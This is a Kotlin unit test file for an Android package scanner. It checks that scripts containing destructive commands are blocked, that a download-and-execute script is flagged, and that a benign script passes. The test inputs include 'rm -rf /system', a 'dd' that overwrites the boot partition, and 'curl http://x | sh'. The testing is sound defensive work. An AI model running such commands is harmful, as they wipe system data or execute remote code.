package com.lingyue.layerbridge.scan

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class ScannerTest {

    @Test
    fun blocksDestructiveCommands() {
        val report = PackageScanner.scanText(
            "postinst.sh",
            "#!/system/bin/sh\nrm -rf /system\n",
        )
        assertTrue(report.blocked)
    }

    @Test
    fun warnsOnDownloadAndEval() {
        val report = PackageScanner.scanText(
            "boot.sh",
            "curl http://x | sh\neval \"\$PAYLOAD\"\n",
        )
        assertFalse(report.blocked)
        assertTrue(report.hasWarnings)
    }

    @Test
    fun allowsNormalScript() {
        val report = PackageScanner.scanText(
            "postinst.sh",
            "#!/system/bin/sh\nmkdir -p /data/local/lb/usr/share/hello\necho ok\n",
        )
        assertFalse(report.blocked)
        assertFalse(report.hasWarnings)
    }

    @Test
    fun scansDirectory() {
        val dir = kotlin.io.path.createTempDirectory("scan").toFile()
        File(dir, "a.sh").writeText("dd if=/dev/zero of=/dev/block/by-name/boot\n")
        val report = PackageScanner.scanDirectory(dir)
        assertTrue(report.blocked)
    }
}
